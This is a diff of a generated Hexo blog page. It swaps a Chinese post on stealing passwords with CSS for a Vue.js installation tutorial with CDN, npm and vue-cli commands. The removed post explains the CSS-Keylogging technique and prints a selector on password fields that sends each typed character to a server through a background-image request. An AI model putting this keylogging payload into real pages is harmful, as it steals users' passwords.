@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>使用Css获取用户密码 | Hexo</title>
+  <title>Vue.js 安装 | Hexo</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -173,40 +173,65 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2019-11-18T03:58:28.000Z" itemprop="datePublished">
-          2019-11-18
+      <time datetime="2019-12-03T05:37:29.837Z" itemprop="datePublished">
+          2019-12-03
       </time>
     
 </span>
-                <h1>使用Css获取用户密码</h1>
+                <h1>Vue.js 安装</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p>
-<p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="noopener">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="noopener">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p>
-<h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p>
-<p>核心代码如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input[type=&quot;password&quot;][value$=&quot;1&quot;] &#123; background-image: url(&quot;http://localhost:3000/1&quot;); &#125;</span><br></pre></td></tr></table></figure>
+      		<h1 id="Vue-js-安装"><a href="#Vue-js-安装" class="headerlink" title="Vue.js 安装"></a>Vue.js 安装</h1><h2 id="1、独立版本"><a href="#1、独立版本" class="headerlink" title="1、独立版本"></a>1、独立版本</h2><p>我们可以在 Vue.js 的官网上直接下载 vue.min.js 并用 **** 标签引入。</p>
+<p><a href="https://vuejs.org/js/vue.min.js" target="_blank" rel="noopener">下载 Vue.js</a> </p>
+<hr>
+<h2 id="2、使用-CDN-方法"><a href="#2、使用-CDN-方法" class="headerlink" title="2、使用 CDN 方法"></a>2、使用 CDN 方法</h2><p>以下推荐国外比较稳定的两个 CDN，国内还没发现哪一家比较好，目前还是建议下载到本地。</p>
+<ul>
+<li><strong>Staticfile CDN（国内）</strong> : <a href="https://cdn.staticfile.org/vue/2.2.2/vue.min.js" target="_blank" rel="noopener">https://cdn.staticfile.org/vue/2.2.2/vue.min.js</a></li>
+<li><strong>unpkg</strong>：<a href="https://unpkg.com/vue/dist/vue.js" target="_blank" rel="noopener">https://unpkg.com/vue/dist/vue.js</a>, 会保持和 npm 发布的最新的版本一致。</li>
+<li><strong>cdnjs</strong> : <a href="https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js" target="_blank" rel="noopener">https://cdnjs.cloudflare.com/ajax/libs/vue/2.1.8/vue.min.js</a></li>
+</ul>
+<h2 id="Staticfile-CDN（国内）"><a href="#Staticfile-CDN（国内）" class="headerlink" title="Staticfile CDN（国内）"></a>Staticfile CDN（国内）</h2><div id="app">   <p></p> </div>
 
-<p>解释如下：</p>
-<p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p>
-<p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p>
-<p><img src="http://blog.static.minfive.com/post/18-02-23/code.png" alt="code"></p>
-<p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>
+
+<p><a href="">尝试一下 »</a></p>
+<h2 id="unpkg（推荐）"><a href="#unpkg（推荐）" class="headerlink" title="unpkg（推荐）"></a>unpkg（推荐）</h2><div id="app">   <p></p> </div>
+
+
+<p><a href="">尝试一下 »</a></p>
+<h2 id="cdnjs"><a href="#cdnjs" class="headerlink" title="cdnjs"></a>cdnjs</h2><div id="app">   <p></p> </div>
+
+
+<p><a href="">尝试一下 »</a></p>
+<hr>
+<h2 id="3、NPM-方法"><a href="#3、NPM-方法" class="headerlink" title="3、NPM 方法"></a>3、NPM 方法</h2><p>由于 npm 安装速度慢，本教程使用了淘宝的镜像及其命令 cnpm，安装使用介绍参照：<a href="">使用淘宝 NPM 镜像</a>。</p>
+<p>npm 版本需要大于 3.0，如果低于此版本需要升级它：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 查看版本</span><br><span class="line">$ npm -v</span><br><span class="line">2.3.0</span><br><span class="line"></span><br><span class="line">#升级 npm</span><br><span class="line">cnpm install npm -g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 升级或安装 cnpm</span><br><span class="line">npm install cnpm -g</span><br></pre></td></tr></table></figure>
+
+<p>在用 Vue.js 构建大型应用时推荐使用 NPM 安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 最新稳定版</span><br><span class="line">$ cnpm install vue</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><p>Vue.js 提供一个官方命令行工具，可用于快速搭建大型单页应用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 全局安装 vue-cli</span><br><span class="line">$ cnpm install --global vue-cli</span><br><span class="line"># 创建一个基于 webpack 模板的新项目</span><br><span class="line">$ vue init webpack my-project</span><br><span class="line"># 这里需要进行一些配置，默认回车即可</span><br><span class="line">This will install Vue 2.x version of the template.</span><br><span class="line"></span><br><span class="line">For Vue 1.x use: vue init webpack#1.0 my-project</span><br><span class="line"></span><br><span class="line">? Project name my-project</span><br><span class="line">? Project description A Vue.js project</span><br><span class="line">? Author runoob &lt;test@runoob.com&gt;</span><br><span class="line">? Vue build standalone</span><br><span class="line">? Use ESLint to lint your code? Yes</span><br><span class="line">? Pick an ESLint preset Standard</span><br><span class="line">? Setup unit tests with Karma + Mocha? Yes</span><br><span class="line">? Setup e2e tests with Nightwatch? Yes</span><br><span class="line"></span><br><span class="line">   vue-cli · Generated &quot;my-project&quot;.</span><br><span class="line"></span><br><span class="line">   To get started:</span><br><span class="line">   </span><br><span class="line">     cd my-project</span><br><span class="line">     npm install</span><br><span class="line">     npm run dev</span><br><span class="line">   </span><br><span class="line">   Documentation can be found at https://vuejs-templates.github.io/webpack</span><br></pre></td></tr></table></figure>
+
+<p>进入项目，安装并运行： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cd my-project</span><br><span class="line">$ cnpm install</span><br><span class="line">$ cnpm run dev</span><br><span class="line"> DONE  Compiled successfully in 4388ms</span><br><span class="line"></span><br><span class="line">&gt; Listening at http://localhost:8080</span><br></pre></td></tr></table></figure>
+
+<p>成功执行以上命令后访问 <a href="http://localhost:8080/，输出结果如下所示：" target="_blank" rel="noopener">http://localhost:8080/，输出结果如下所示：</a></p>
+<p><img src="https:////www.runoob.com/wp-content/uploads/2017/01/56219E04-D156-43EC-AC59-BFE7E38A62C3.jpg" alt="img"></p>
+<blockquote>
+<p><strong>注意：</strong>Vue.js 不支持 IE8 及其以下 IE 版本。</p>
+</blockquote>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="/2019/12/03/Vue.js%20%E5%AE%89%E8%A3%85/" style="float: left;">
-        ← Vue.js 安装
-    </a>
     
-    
-    <a class="pull-right" href="/2019/10/31/%E5%88%9B%E5%BB%BA%E6%96%B0%E5%8D%9A%E5%AE%A2/">
-        创建新博客 →
+    <a class="pull-right" href="/2019/11/18/%E4%BD%BF%E7%94%A8Css%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/">
+        使用Css获取用户密码 →
     </a>
     
 </nav>
